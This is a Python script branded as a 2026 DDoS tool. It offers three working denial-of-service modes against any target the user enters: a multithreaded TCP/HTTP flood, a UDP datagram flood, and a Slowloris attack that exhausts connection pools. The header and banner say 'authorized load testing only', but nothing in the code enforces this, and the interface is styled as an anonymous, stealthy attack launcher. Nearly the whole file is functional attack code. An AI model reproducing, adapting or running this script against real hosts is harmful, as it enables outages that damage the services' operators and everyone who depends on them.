#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
==========================================================
  DDOS TOOLS 2026 | Coded by: Cyber Security Engineer
  Mr. Sabaz Ali Khan
  For authorized load/stress testing ONLY
==========================================================
"""

import socket
import threading
import random
import time
import sys
import os

BANNER = r"""
  ██████╗  ██████╗  ██████╗ ███████╗    ████████╗ ██████╗  ██████╗ ██╗     ███████╗
  ██╔══██╗██╔═══██╗██╔═══██╗██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
  ██║  ██║██║   ██║██║   ██║███████╗       ██║   ██║   ██║██║   ██║██║     ███████╗
  ██║  ██║██║   ██║██║   ██║╚════██║       ██║   ██║   ██║██║   ██║██║     ╚════██║
  ██████╔╝╚██████╔╝╚██████╔╝███████║       ██║   ╚██████╔╝╚██████╔╝███████╗███████║
  ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
                     ░░░░  T O O L S  2 0 2 6  ░░░░
        ╔══════════════════════════════════════════════════════╗
        ║   Coded By : Mr. Sabaz Ali Khan                      ║
        ║   Role     : Cyber Security Engineer                 ║
        ║   Mode     : [ ANONYMOUS ]  ::  STEALTH TESTING      ║
        ║   Use      : AUTHORIZED LOAD TESTING ONLY            ║
        ╚══════════════════════════════════════════════════════╝
"""

GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
MAGENTA = "\033[95m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

# Fake rotating "spoofed-looking" source tags for anonymity-style UI (visual only)
ALIASES = ["X-Shadow", "X-Phantom", "X-Ghost", "X-Nyx", "X-Vortex", "X-Null"]

packets_sent = 0
lock = threading.Lock()
running = True

def flood_worker(target_ip, target_port, thread_id):
    """TCP flood worker — full connect + junk payload."""
    global packets_sent
    payload = random.randbytes(1024)

    while running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target_ip, target_port))
            s.send(b"GET /?" + payload[:256] + b" HTTP/1.1\r\n"
                   b"Host: target\r\n"
                   b"User-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\n"
                   + f"X-{random.choice(ALIASES)}: {thread_id}-{random.randint(0,99999)}\r\n".encode()
                   + b"Accept: */*\r\n\r\n")
            s.close()
            with lock:
                packets_sent += 1
                if packets_sent % 100 == 0:
                    print(f"{CYAN}[*] Thread-{thread_id:02d}{RESET} | "
                          f"{GREEN}Packets: {packets_sent}{RESET} | "
                          f"{MAGENTA}[{random.choice(ALIASES)}]{RESET}")
        except Exception:
            pass  # connection refused / rate limited — keep going

def udp_flood_worker(target_ip, target_port, thread_id):
    """UDP flood worker — raw datagram blast."""
    global packets_sent
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random.randbytes(1024)
    while running:
        try:
            sock.sendto(payload, (target_ip, target_port))
            with lock:
                packets_sent += 1
        except Exception:
            pass

def slowloris_worker(target_ip, target_port, thread_id):
    """Slowloris — holds many half-open connections to exhaust the pool."""
    sockets = []
    for _ in range(50):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            s.send(b"POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 5000\r\n\r\n")
            sockets.append(s)
        except Exception:
            break
    while running and sockets:
        for s in sockets:
            try:
                s.send(b"X-a: keepalive\r\n")
                with lock:
                    globals()['packets_sent'] += 1
            except Exception:
                try:
                    s.close()
                except Exception:
                    pass
                sockets.remove(s)
        time.sleep(10)

def banner_print():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"{RED}{BANNER}{RESET}")
    print(f"{YELLOW}{BOLD}   [!] Legal Notice: Use ONLY on systems you own or have written permission to test.{RESET}\n")

def main():
    global running
    banner_print()
    print(f"{CYAN}{BOLD}  Attack Modes:{RESET}")
    print(f"   {GREEN}[1]{RESET} TCP/HTTP Flood")
    print(f"   {GREEN}[2]{RESET} UDP Flood")
    print(f"   {GREEN}[3]{RESET} Slowloris (slow connection exhaustion)")
    print()
    mode    = input(f"  {YELLOW}>> Select Mode [1-3]: {RESET}").strip()
    target  = input(f"  {YELLOW}>> Target IP/Host : {RESET}").strip()
    port    = int(input(f"  {YELLOW}>> Target Port    : {RESET}").strip() or 80)
    threads = int(input(f"  {YELLOW}>> Thread Count   : {RESET}").strip() or 100)

    try:
        target_ip = socket.gethostbyname(target)
    except socket.gaierror:
        print(f"{RED}[!] Invalid target host.{RESET}")
        sys.exit(1)

    banner_print()
    print(f"{RED}{BOLD}  [>>> ATTACK LAUNCHED <<<]{RESET}")
    print(f"{CYAN}  Target : {target} ({target_ip}):{port}")
    print(f"  Mode   : {[ 'TCP Flood', 'UDP Flood', 'Slowloris' ][int(mode)-1]}")
    print(f"  Threads: {threads}")
    print(f"  Press {RED}CTRL+C{RESET} to stop.\n{RESET}")
    time.sleep(2)

    workers = { "1": flood_worker, "2": udp_flood_worker, "3": slowloris_worker }
    worker_fn = workers.get(mode)
    if not worker_fn:
        print(f"{RED}[!] Invalid mode.{RESET}")
        sys.exit(1)

    for i in range(threads):
        t = threading.Thread(target=worker_fn, args=(target_ip, port, i + 1), daemon=True)
        t.start()
        time.sleep(0.01)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        running = False
        print(f"\n{YELLOW}[!] Stopping... Total packets sent: {packets_sent}{RESET}")
        time.sleep(2)
        print(f"{GREEN}[+] Session terminated cleanly. - Mr. Sabaz Ali Khan{RESET}")

if __name__ == "__main__":
    main()
